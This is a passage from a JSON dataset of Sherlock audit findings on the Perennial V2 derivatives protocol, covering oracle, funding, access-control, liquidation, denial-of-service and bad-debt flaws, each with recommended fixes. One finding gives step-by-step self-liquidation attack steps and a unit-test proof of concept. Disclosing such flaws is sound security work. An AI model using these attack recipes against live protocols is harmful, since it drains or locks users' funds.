      "summary": "\nThis bug report is about an issue found in the `Oracle.status()` method of the `Oracle` contract in the `2023-07-perennial-judging` GitHub repository. The issue is that when the `Oracle.update(newProvider)` method is called, the `latestVersion` of the `Oracle.status()` may go backwards, resulting in an incorrect settlement in the `_processPositionLocal()` method. This is because there is no requirement for `newProvider.latest().timestamp > oldProvider.latest().timestamp`.\n\nThe bug was found by WATCHPUG and the impact is that during the `processLocal`, encountering a non-existing version will result in using 0 as the `makerValue`, `longValue`, and `shortValue` to settle PNL, causing the user's collateral to be deducted incorrectly. This is because line 350 is skipped (as the global has been settled to a newer timestamp), and line 356 enters the if branch.\n\nThe code snippets related to the bug can be found in the following GitHub links:\n- https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L106-L117\n- https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L327-L364\n- https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L390-L423\n- https://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L430-L457\n\nThe bug was found using manual review and the recommendation to fix the bug is to consider requiring `newProvider.latest().timestamp > oldProvider.latest().timestamp` in the `Oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/145",
      "tags": [],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "24312",
      "title": "M-8: `_accumulateFunding()` maker will get the wrong amount of funding fee.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/139 \n\n## Found by \nWATCHPUG\n\n## Vulnerability Detail\n\nThe formula that calculates the amount of funding in `Version#_accumulateFunding()` on the maker side is incorrect. This leads to an incorrect distribution of funding between the minor and the maker's side.\n\n```solidity\n// Redirect net portion of minor's side to maker\nif (fromPosition.long.gt(fromPosition.short)) {\n    fundingValues.fundingMaker = fundingValues.fundingShort.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingShort = fundingValues.fundingShort.sub(fundingValues.fundingMaker);\n}\nif (fromPosition.short.gt(fromPosition.long)) {\n    fundingValues.fundingMaker = fundingValues.fundingLong.mul(Fixed6Lib.from(fromPosition.skew().abs()));\n    fundingValues.fundingLong = fundingValues.fundingLong.sub(fundingValues.fundingMaker);\n}\n```\n\n## PoC\n\nGiven:\n\n- long/major: 1000\n- short/minor: 1\n- maker: 1\n\nThen:\n\n1. skew(): 999/1000\n2. fundingMaker: 0.999 of the funding\n3. fundingShort: 0.001 of the funding\n\nWhile the maker only matches for `1` of the major part and contributes to half of the total short side, it takes the entire funding.\n\n## Impact\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/types/Version.sol#L207-L215\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe correct formula to calculate the amount of funding belonging to the maker side should be:\n\n```markdown\nfundingMakerRatio = min(maker, major - minor) / min(major, minor + maker)\nfundingMaker = fundingMakerRatio * fundingMinor\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n**panprog** commented:\n> medium because incorrect result only starts appearing if abs(long-short) > maker and the larger the difference, the more incorrect the split of funding is. But this situation is exceptional case, most of the time abs(long-short) < maker due to efficiency and liquidity limits\n\n\n\n**arjun-io**\n\nWe'd like to re-open this as it does appear to be a valid issue. Medium severity seems correct here\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/64",
      "summary": "\nThis bug report is about an issue found in the `Version#_accumulateFunding()` formula on the maker side which leads to an incorrect distribution of funding between the minor and the maker's side. The formula should be min(maker, major - minor) / min(major, minor + maker) instead. The issue was found by WATCHPUG and was confirmed by sherlock-admin and arjun-io. It was given a medium severity rating and was fixed by arjun-io with the given pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/139",
      "tags": [],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "24311",
      "title": "M-7: update() wrong privilege control",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/121 \n\n## Found by \nbin2chen\n`oracle.update()`  wrong privilege control\nlead to `OracleFactory.update()` unable to add `oracleProvider`\n\n## Vulnerability Detail\nin `OracleFactory.update()` will call `oracle.update()`\n\n```solidity\ncontract OracleFactory is IOracleFactory, Factory {\n...\n    function update(bytes32 id, IOracleProviderFactory factory) external onlyOwner {\n        if (!factories[factory]) revert OracleFactoryNotRegisteredError();\n        if (oracles[id] == IOracleProvider(address(0))) revert OracleFactoryNotCreatedError();\n\n        IOracleProvider oracleProvider = factory.oracles(id);\n        if (oracleProvider == IOracleProvider(address(0))) revert OracleFactoryInvalidIdError();\n\n        IOracle oracle = IOracle(address(oracles[id]));\n@>      oracle.update(oracleProvider);\n    }\n\n```\n\nBut `oracle.update()` permission is needed for `OracleFactory.owner()` and not `OracleFactory` itself.\n\n```solidity\n@>  function update(IOracleProvider newProvider) external onlyOwner {\n        _updateCurrent(newProvider);\n        _updateLatest(newProvider.latest());\n    }\n\n    modifier onlyOwner {\n@>      if (msg.sender != factory().owner()) revert InstanceNotOwnerError(msg.sender);\n        _;\n    }\n```\n\nThis results in `OracleFactory` not being able to do `update()`.\nSuggest changing the limit of ``oracle.update()`` to ``factory()``.\n\n## Impact\n\n`OracleFactory.update()` unable to add `IOracleProvider`\n\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/OracleFactory.sol#L81\n\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```solidity\ncontract Oracle is IOracle, Instance {\n...\n\n-   function update(IOracleProvider newProvider) external onlyOwner {\n+   function update(IOracleProvider newProvider) external {\n+       require(msg.sender == factory(),\"invalid sender\");\n        _updateCurrent(newProvider);\n        _updateLatest(newProvider.latest());\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/81",
      "summary": "\nThis bug report is about the wrong privilege control in `oracle.update()` which lead to `OracleFactory.update()` being unable to add `oracleProvider`. The wrong privilege control means that `oracle.update()` permission is needed for `OracleFactory.owner()` and not `OracleFactory` itself. This results in `OracleFactory` not being able to do `update()`. It was suggested to change the limit of `oracle.update()` to `factory()`. The impact of this bug is that `OracleFactory.update()` is unable to add `IOracleProvider`. The code snippet is from the Github repository of the project and the tool used to detect this bug was manual review. The recommended solution is to change the code snippet to the one provided in the report. Finally, the issue was discussed by two users and the fix was accepted and implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/121",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "24310",
      "title": "M-6: It is possible to open and liquidate your own position in 1 transaction to overcome efficiency and liquidity removal limits at almost no cost",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/104 \n\n## Found by \nEmmanuel, panprog\n\nThe way the protocol is setup, it is possible to open positions or withdraw collateral up to exactly maintenance limit (some percentage of notional). However, this means that it's possible to be at almost liquidation level intentionally and moreover, the current oracle setup allows to open and immediately liquidate your own position in 1 transaction, effectively bypassing efficiency and liquidity removal limits, paying only the keeper (and possible position open/close) fees, causing all kinds of malicious activity which can harm the protocol.\n\n## Vulnerability Detail\n\nThe user can liquidate his own position with 100% guarantee in 1 transaction by following these steps:\n1. It can be done on existing position or on a new position\n2. Record Pyth oracle prices with signatures until you encounter a price which is higher (or lower, depending on your position direction) than latest oracle version price by any amount.\n3. In 1 transaction do the following:\n3.1. Make the position you want to liquidate at exactly the edge of liquidation: withdraw maximum allowed amount or open a new position with minimum allowed collateral\n3.2. Commit non-requested oracle version with the price recorded earlier (this price makes the position liquidatable)\n3.3. Liquidate your position (it will be allowed, because the position generates a minimum loss due to price change and becomes liquidatable)\n\nSince all liquidation fee is given to user himself, liquidation of own position is almost free for the user (only the keeper and position open/close fee is paid if any).\n\n## Impact\n\nThere are different malicious actions scenarios possible which can abuse this issue and overcome efficiency and liquidity removal limitations (as they're ignored when liquidating positions), such as:\n- Open large maker and long or short position, then liquidate maker to cause mismatch between long/short and maker (socialize positions). This will cause some chaos in the market, disbalance between long and short profit/loss and users will probably start leaving such chaotic market, so while this attack is not totally free, it's cheap enough to drive users away from competition.\n- Open large maker, wait for long and/or short positions from normal users to accumulate, then liquidate most of the large maker position, which will drive taker interest very high and remaining small maker position will be able to accumulate big profit with a small risk.\n- Just open long/short position from different accounts and wait for the large price update and frontrun it by withdrawing max collateral from the position which will be in a loss, and immediately liquidate it in the same transaction: with large price update one position will be liquidated with bad debt while the other position will be in a large profit, total profit from both positions will be positive and basically risk-free, meaning it's at the expense of the other users. While this strategy is possible to do on its own, liquidation in the same transaction allows it to be more profitable and catch more opportunities, meaning more damage to the other protocol users.\n\nThe same core reason can also cause unsuspecting user to be unexpectedly liquidated in the following scenario:\n1. User opens position (10 ETH long at $1000, with $10000 collateral). User is choosing very safe leverage = 1. Market maintenance is set to 20% (max leverage = 5)\n2. Some time later the price is still $1000 and user decides to close most of his position and withdraw collateral, so he reduces his position to 2 ETH long and withdraws $8000 collateral, leaving his position with $2000 collateral. It appears that the user is at the safe leverage = 1 again.\n3. Right in the same block the liquidator commits non-requested oracle with a price $999.999 and immediately liquidates the user.\n\nThe user is unsuspectedly liquidated even though he thought that he was at leverage = 1. But since collateral is withdrawn immediately, but position changes only later, user actually brought his position to max leverage and got liquidated. While this might be argued to be the expected behavior, it might still be hard to understand and unintuitive for many users, so it's better to prevent such situation from happening and the fix is the same as the one to fix self-liquidations.\n\n## Proof of concept\n\nThe scenario of liquidating unsuspecting user is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```solidity\nit('panprog liquidate unsuspecting user / self in 1 transaction', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.2'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('1000')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('100')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, collateral, false)\n\n    // settle\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    await market.connect(userB).update(userB.address, parse6decimal('10.000'), 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, parse6decimal('1.000'), 0, 0, false)\n\n    // withdraw\n    var collateral = parse6decimal('800')\n    dsu.transfer.whenCalledWith(userB.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('2.000'), 0, 0, collateral.mul(-1), false)\n\n    // liquidate unsuspecting user\n    setupOracle('100.01', TIMESTAMP + 150, TIMESTAMP + 200);\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('100.01')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(userB.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('100.01', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    var pos = await market.positions(userB.address);\n    console.log(\"Liquidated maker: collateral = \" + info.collateral + \" maker = \" + pos.maker);\n\n})\n```\n\nConsole output for the code:\n```solidity\nLiquidated maker: collateral = 99980000 maker = 0\n```\n\nSelf liquidation is the same, just the liquidator does this in 1 transaction and is owned by userB.\n\n## Code Snippet\n\nAccount solvency is calculated as meeting the minimum collateral of maintenance (percentage of notional):\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/types/Position.sol#L305\n\nIt is possible to bring user to exactly the edge of liquidation, when minimum loss makes him liquidatable.\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIndustry standard is to have initial margin (margin required to open position or withdraw collateral) and maintenance margin (margin required to keep the position solvent). Initial margin > maintenance margin and serves exactly for the reason to prevent users from being close to liquidation, intentional or not. I suggest to implement initial margin as a measure to prevent such self liquidation or unsuspected user liquidations. This will improve user experience (remove a lot of surprise liquidations) and will also improve security by disallowing intentional liquidations and cheaply overcoming the protocol limits such as efficiency limit: intentional liquidations are never good for the protocol as they're most often malicious, so having the ability to liquidate yourself in 1 transaction should definetely be prohibited.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nThe self liquidations do seem possible here, we'll look further into the downstream impacts to figure out any fixes we want to implement.\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/92",
      "summary": "\nThis bug report discusses an issue where it is possible to open and liquidate one's own position in a single transaction, thereby bypassing efficiency and liquidity removal limits, and paying only the keeper and possibly position open/close fees. This malicious activity can cause all kinds of damage to the protocol, such as opening large maker and long or short positions, then liquidating the maker to cause a mismatch between the long/short and maker (socialize positions) and drive users away from the market. It can also cause unsuspecting users to be unexpectedly liquidated, as when a user opens a position, withdraws collateral, and then a large price update causes one position to be liquidated with bad debt while the other is in a large profit.\n\nThe bug report includes a proof of concept to demonstrate the scenario of liquidating an unsuspecting user, and a code snippet to show how account solvency is calculated. The recommended fix is to implement an initial margin, which would be greater than the maintenance margin, and would help to prevent users from being close to liquidation, both intentional and unintentional. This would improve user experience and security by disallowing intentional liquidations and cheaply overcoming the protocol limits. The bug report has been fixed and the fix can be viewed on GitHub.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/104",
      "tags": [],
      "finders": [
        "panprog",
        "Emmanuel"
      ]
    },
    {
      "id": "24309",
      "title": "M-5: Market: DoS when stuffed with pending protected positions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/94 \n\n## Found by \nn33k\n\nMarket has no limit on how many protected position updates can be added into pending position update queue. When settling these pending position updates, transations can OOG revert. This fully bricks the protocol and funds will be locked forever.\n\n## Vulnerability Detail\n\nIn `_invariant`, there is a limit on the number of pending position updates. But for `protected` position updates, `_invariant` returns early and does not trigger this check.\n\n```solidity\n    function _invariant(\n        Context memory context,\n        address account,\n        Order memory newOrder,\n        Fixed6 collateral,\n        bool protected\n    ) private view {\n        ....\n\n        if (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n        ....\n            if (\n            context.global.currentId > context.global.latestId + context.marketParameter.maxPendingGlobal ||\n            context.local.currentId > context.local.latestId + context.marketParameter.maxPendingLocal\n        ) revert MarketExceedsPendingIdLimitError();\n        ....\n    }\n```\n\nAfter the `_invariant` check, the postion updates will be added into pending position queues.\n\n```solidity\n        _invariant(context, account, newOrder, collateral, protected);\n\n        // store\n        _pendingPosition[context.global.currentId].store(context.currentPosition.global);\n        _pendingPositions[account][context.local.currentId].store(context.currentPosition.local);\n```\n\nWhen the protocol enters next oracle version, the global pending queue `_pendingPosition` will be settled in a loop.\n\n```solidity\n    function _settle(Context memory context, address account) private {\n        ....\n        // settle\n        while (\n            context.global.currentId != context.global.latestId &&\n            (nextPosition = _pendingPosition[context.global.latestId + 1].read()).ready(context.latestVersion)\n        ) _processPositionGlobal(context, context.global.latestId + 1, nextPosition);\n```\n\nThe OOG revert happens if there are too many pending position updates.\n\nThis revert will happend on every `update` calls because they all need to settle this `_pendingPosition` before update.\n\n```solidity\n    function update(\n        address account,\n        UFixed6 newMaker,\n        UFixed6 newLong,\n        UFixed6 newShort,\n        Fixed6 collateral,\n        bool protect\n    ) external nonReentrant whenNotPaused {\n        Context memory context = _loadContext(account);\n        _settle(context, account);\n        _update(context, account, newMaker, newLong, newShort, collateral, protect);\n        _saveContext(context, account);\n    }\n```\n\n## Impact\n\nThe protocol will be fully unfunctional and funds will be locked. There will be no recover to this DoS.\n\nA malicious user can tigger this intentionally at very low cost. Alternatively, this can occur during a volatile market period when there are massive liquidations.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L497\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L505-L508\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L333-L337\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEither or both,\n1. Limit the number of pending protected position updates can be queued in `_invariant`.\n2. Limit the number of global pending protected postions can be settled in `_settle`.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> x\n\n**panprog** commented:\n> medium because it's actually very hard to create many pending positions and at the same time liquidate: new pending position is only created once time advances by the granularity. If previous pending positions are not still settled, this means there were no oracle commits, this means that market price didn't change and accounts can be liquidated the whole time.\n\n\n\n**syjcnss**\n\nEscalate\n\nThis should be valid high.\n\nBecause the impact is critical and should never happen even under edge cases.\n\nThis DoS does not require an attacker. The protocol could enter such state spontaneously if conditions are met.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This should be valid high.\n> \n> Because the impact is critical and should never happen even under edge cases.\n> \n> This DoS does not require an attacker. The protocol could enter such state spontaneously if conditions are met.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**panprog**\n\nEscalate\n\nI agree that this issue is valid. However, it should be medium, not high, because it's actually quite unlikely to enter such state:\n1. New pending position (both global and local) is only created when `oracle.current()` timestamp changes. Since it's in granularities, this happens every `granularity` seconds.\n2. Whenever an oracle version is commited, all pending positions up to that commit are settled. This means that in order to enter such state - there should be a large number of consecutive requested and uncommited oracle versions.\n3. Since such state can only happen when there is no oracle commit for a long time, this means that all this time the same price is used for liquidation, so all accounts potentially liquidatable are liquidatable for this entire time, and for such state to happen, at least 1 account should be liquidated in each different granularity timestamp, which is unlikely - liquidations are more likely to happen all in the first 1-2 oracle versions.\n\nExample of what has to happen to cause this bug:\n-- no accounts liquidatable\nt=120: oracle commits new price for `oracle version` = 100\nFor example, the price change is high and causes mass liquidations\nt=130: liquidation (new pending position at timestamp 200, 1 pending position)\nt=140: liquidation (same pending position at timestamp 200, still 1 pending position)\nt=150: liquidation (same)\n...\nt=210: liquidation (new pending position at timestamp 200, 2 pending positions)\nt=220: liquidation (same, 2 pending)\n...\n(no oracle commit for timestamp=200)\n...\nt=310: liquidation (new pending position at timestamp 300, 3 pending positions)\n... (no oracle commits for neither timestamps 200, nor 300)\nt=410: liquidation (4 pending)\n... (still no oracle commits)\nt=510: liquidation (5 pending)\n... (still no oracle commits)\nt=610: liquidation (6 pending -> exceeds pending positions limit)\n\nSo if pending limit is 5, there should be:\n- no oracle commits for at least 4 * granularity seconds\n- at least 1 position change request each granularity window\n- at least 1 liquidation after 4 * granularity seconds have passed - remember that all 4 * granularity seconds all positions are liquidatable, so they're much more likely to happen earlier rather than after such long period of time.\n\nThis will allow to exceed the pending limit. However, the real impact (protocol funds get stuck) will likely occur much later after even more oracle versions and liquidations, because it's unlikely that pending limit is set at the edge of transaction max gas limit.\n\nSo given conditions which are quite rare to occur, but possible, this should be medium.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> I agree that this issue is valid. However, it should be medium, not high, because it's actually quite unlikely to enter such state:\n> 1. New pending position (both global and local) is only created when `oracle.current()` timestamp changes. Since it's in granularities, this happens every `granularity` seconds.\n> 2. Whenever an oracle version is commited, all pending positions up to that commit are settled. This means that in order to enter such state - there should be a large number of consecutive requested and uncommited oracle versions.\n> 3. Since such state can only happen when there is no oracle commit for a long time, this means that all this time the same price is used for liquidation, so all accounts potentially liquidatable are liquidatable for this entire time, and for such state to happen, at least 1 account should be liquidated in each different granularity timestamp, which is unlikely - liquidations are more likely to happen all in the first 1-2 oracle versions.\n> \n> Example of what has to happen to cause this bug:\n> -- no accounts liquidatable\n> t=120: oracle commits new price for `oracle version` = 100\n> For example, the price change is high and causes mass liquidations\n> t=130: liquidation (new pending position at timestamp 200, 1 pending position)\n> t=140: liquidation (same pending position at timestamp 200, still 1 pending position)\n> t=150: liquidation (same)\n> ...\n> t=210: liquidation (new pending position at timestamp 200, 2 pending positions)\n> t=220: liquidation (same, 2 pending)\n> ...\n> (no oracle commit for timestamp=200)\n> ...\n> t=310: liquidation (new pending position at timestamp 300, 3 pending positions)\n> ... (no oracle commits for neither timestamps 200, nor 300)\n> t=410: liquidation (4 pending)\n> ... (still no oracle commits)\n> t=510: liquidation (5 pending)\n> ... (still no oracle commits)\n> t=610: liquidation (6 pending -> exceeds pending positions limit)\n> \n> So if pending limit is 5, there should be:\n> - no oracle commits for at least 4 * granularity seconds\n> - at least 1 position change request each granularity window\n> - at least 1 liquidation after 4 * granularity seconds have passed - remember that all 4 * granularity seconds all positions are liquidatable, so they're much more likely to happen earlier rather than after such long period of time.\n> \n> This will allow to exceed the pending limit. However, the real impact (protocol funds get stuck) will likely occur much later after even more oracle versions and liquidations, because it's unlikely that pending limit is set at the edge of transaction max gas limit.\n> \n> So given conditions which are quite rare to occur, but possible, this should be medium.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**syjcnss**\n\nI agree with @panprog on his 1,2,3 explainations on why `it's actually quite unlikely to enter such state`.\n\nI think it should be high because there is **NO attacker/special setup**(i.e., `pending limit is set at the edge of transaction max gas limit` in @panprog's comment) **required** for this locking of fund to happen.\n\n**panprog**\n\nI agree that this state can happen by itself without special setup or attacker, but the likelihood is very low, that's why it's medium. Refer to sherlock rules on how to identify high and medium issues, high issues do not require limiting external conditions, medium issues require certain external conditions or specific states - that's exactly the case for this issue.\n\nhttps://docs.sherlock.xyz/audits/judging/judging#how-to-identify-a-high-issue\n\n**How to identify a high issue:**\n* **Definite loss of funds without limiting external conditions.**\n* Breaks core contract functionality, rendering the protocol/contract useless (should not be easily replaced without loss of funds) and definitely causes significant loss of funds.\n* Significant loss of funds/large profit for the attacker at a minimal cost.\n\n**How to identify a medium issue:**\n* **Causes a loss of funds but requires certain external conditions or specific states.**\n* Breaks core contract functionality, rendering the contract useless (should not be easily replaced without loss of funds) or leading to unknown potential exploits/loss of funds. Eg: Unable to remove malicious user/collateral from the contract.\n* A material loss of funds, no/minimal profit for the attacker at a considerable cost\n\n\n\n**syjcnss**\n\nDon't think `medium issues require certain external conditions or specific states` applies to this one.\n\nThe conditions are that untrusted 3rd-party liquidators&keepers behave non-ideally(slow liquidation&price commit) under massive liquidations which should be considered met. And once is all it takes to lock fund.\n\n**arjun-io**\n\nThis is a valid state that can occur so in our view this is a valid issue. However, we agree that there is a very low likelihood that this can occur with correct parameters set for the market\n\n**syjcnss**\n\nThe likelihood is low but the result is untolerable.\n\nThe protocol is relying on untrusted 3rd parties to prevent this from happenning. The probability increases under congested network conditions and low liquidator/keeper performance.\n\nDespite the severity of this issue in the contest I suggest to have a fix.\n\n**141345**\n\nThe condition for this to be valid is strict. With long granularity, and large number of pending positions. For a malicious user, there is cost of the position and potential risk. The likelihood for it to happen by user self is even lower.\nSeems medium severity according to the [criteria](https://docs.sherlock.xyz/audits/judging/judging).\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nAgree with the above Escalation and the comment on why this issue should be valid medium. \nhttps://github.com/sherlock-audit/2023-07-perennial-judging/issues/94#issuecomment-1697453789\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [syjcnss](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/94/#issuecomment-1694616215): accepted\n- [panprog](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/94/#issuecomment-1694626133): accepted",
      "summary": "\nIssue M-5 is a bug report related to Market, a protocol in the Sherlock audit. The bug was found by n33k and reported on the GitHub repository. The bug causes a Denial of Service (DoS) when the Market protocol is stuffed with pending protected positions. The bug occurs because there is no limit on how many protected position updates can be added into the pending position update queue. When settling these pending position updates, transactions can OOG revert, which fully bricks the protocol and locks the funds forever.\n\nThe impact of this bug is critical, as the protocol will be fully unusable and the funds will be locked. This can be triggered intentionally by a malicious user at a very low cost, or it can occur during a volatile market period when there are massive liquidations. The code snippet related to this bug can be found in the GitHub repository.\n\nThe issue was discussed by several people, and a consensus was reached that this should be considered a valid medium severity issue. The condition for this to be valid is strict, and with long granularity, and large number of pending positions, the likelihood for it to happen by a user themselves is even lower. The likelihood is low but the result is untolerable, as the protocol is relying on untrusted third parties to prevent this from happening, and the probability increases under congested network conditions and low liquidator/keeper performance. Despite the severity of this issue, it was suggested to have a fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/94",
      "tags": [],
      "finders": [
        "n33k"
      ]
    },
    {
      "id": "24308",
      "title": "M-4: Bad debt (shortfall) liquidation leaves liquidated user in a negative collateral balance which can cause bank run and loss of funds for the last users to withdraw",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/72 \n\n## Found by \nWATCHPUG, panprog\n\nBad debt liquidation leaves liquidated user with a negative collateral. However, there is absolutely no incentive for anyone to repay this bad debt. This means that most of the time the account with negative balance will simply be abandoned. This means that this negative balance (bad debt) is taken from the other users, however it is not socialized, meaning that the first users to withdraw will be able to do so, but the last users will be unable to withdraw because protocol won't have enough funds. This means that any large bad debt in the market can trigger a bank run with the last users to withdraw losing their funds.\n\n## Vulnerability Detail\n\nConsider the following scenario:\n1. User1 and User2 are the only makers in the market each with maker=50 position and each with collateral=500. (price=$100)\n2. A new user comes into the market and opens long=10 position with collateral=10.\n3. Price drops to $90. Some liquidator liquidates the user, taking $10 liquidation fee. User is now left with the negative collateral = -$100\n4. Since User1 and User2 were the other party for the user, each of them has a profit of $50 (both users have collateral=550)\n5. At this point protocol has total funds from deposit of User1($500) + User2($500) + new user($10) - liquidator($10) = $1000. However, User1 and User2 have total collateral of 1100.\n6. User1 closes position and withdraws $550. This succeeds. Protocol now has only $450 funds remaining and 550 collateral owed to User2.\n7. User2 closes position and tries to withdraw $550, but fails, because protocol doesn't have enough funds. User2 can only withdraw $450, effectively losing $100.\n\nSince all users know about this feature, after bad debt they will race to be the first to withdraw, triggering a bank run.\n\n## Impact\n\nAfter **ANY** bad debt, the protocol collateral for all non-negative users will be higher than protocol funds available, which can cause a bank run and a loss of funds for the users who are the last to withdraw.\n\nEven if someone covers the shortfall for the user with negative collateral, this doesn't guarantee absence of bank run:\n1. If the shortfall is not covered quickly for any reason, the other users can notice disparency between collateral and funds in the 